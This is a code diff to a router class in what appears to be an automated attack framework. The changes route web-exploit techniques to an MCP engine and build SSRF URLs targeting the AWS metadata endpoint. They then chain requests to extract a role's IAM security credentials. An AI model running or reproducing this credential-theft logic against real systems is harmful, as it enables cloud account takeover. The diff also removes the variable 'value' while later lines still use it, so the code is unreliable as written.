@@ -353,6 +353,10 @@ class EngineRouter:
                 db, exec_id, now, technique_id, target_id, operation_id, ooda_iteration_id
             )
 
+        # Force MCP engine for web exploit techniques regardless of Orient recommendation
+        if technique_id in _WEB_EXPLOIT_TECHNIQUES:
+            engine = "mcp"
+
         # -- ADR-048: Web exploit via MCP web-scanner (SSRF, cloud pivot) --
         # Must come BEFORE initial access check because T1078.004 (cloud
         # accounts) shares the T1078 prefix with InitialAccessEngine, but
@@ -511,8 +515,16 @@ class EngineRouter:
 
             # ADR-048: Two-step IMDS chain — if response body is plain text
             # (role name, not JSON), auto-chain step 2 to get full credentials
-            body1 = (result.output or "").strip()
-            if body1 and not body1.startswith("{") and not body1.startswith("["):
+            raw = (result.output or "").strip()
+            # MCP returns JSON envelope {"facts": [...], "raw_output": "..."}
+            body1 = raw
+            try:
+                import json as _json
+                parsed = _json.loads(raw)
+                body1 = (parsed.get("raw_output") or "").strip()
+            except (ValueError, TypeError, AttributeError):
+                pass
+            if body1 and not body1.startswith("{") and not body1.startswith("[") and not body1.startswith("<"):
                 role_name = body1.split("\n")[0].strip()
                 if role_name:
                     credential_url = f"{ssrf_url.rstrip('/')}/{role_name}"
@@ -560,17 +572,31 @@ class EngineRouter:
             "WHERE operation_id = $1 AND ("
             "  trait = 'web.vuln.ssrf' OR trait = 'web.dir.found' "
             "  OR trait = 'web.http.response'"
-            ") ORDER BY collected_at DESC LIMIT 10",
+            ") ORDER BY "
+            "  CASE WHEN value LIKE '%imds_confirmed%' THEN 0 ELSE 1 END, "
+            "  collected_at DESC "
+            "LIMIT 20",
             operation_id,
         )
         for row in rows:
             raw_value = row["value"]
-            # web.dir.found format: "{url}|{status}" — extract URL part
-            value = raw_value.split("|")[0] if "|" in raw_value else raw_value
+            parts = raw_value.split("|") if "|" in raw_value else [raw_value]
 
             if row["trait"] == "web.vuln.ssrf":
-                base = value.rstrip("/")
-                return f"{base}/169.254.169.254/latest/meta-data/iam/security-credentials/"
+                # Format: "type|url|canary_result" e.g. "path_proxy|http://host/proxy/...|imds_confirmed"
+                # IMDS-confirmed entries already contain the full IMDS path — use directly
+                url_part = parts[1] if len(parts) > 1 else parts[0]
+                if "imds_confirmed" in raw_value and "169.254.169.254" in url_part:
+                    # Already a full IMDS URL, just ensure it ends with security-credentials/
+                    base = url_part.rstrip("/")
+                    if "security-credentials" not in base:
+                        return f"{base}/iam/security-credentials/"
+                    return f"{base}/"
+                # Non-IMDS SSRF — append IMDS path to proxy URL
+                url_part = url_part.rstrip("/")
+                if url_part.startswith("http"):
+                    return f"{url_part}/169.254.169.254/latest/meta-data/iam/security-credentials/"
+                continue
             if any(kw in value.lower() for kw in _SSRF_PROXY_KEYWORDS):
                 base = value.rstrip("/")
                 return f"{base}/169.254.169.254/latest/meta-data/iam/security-credentials/"
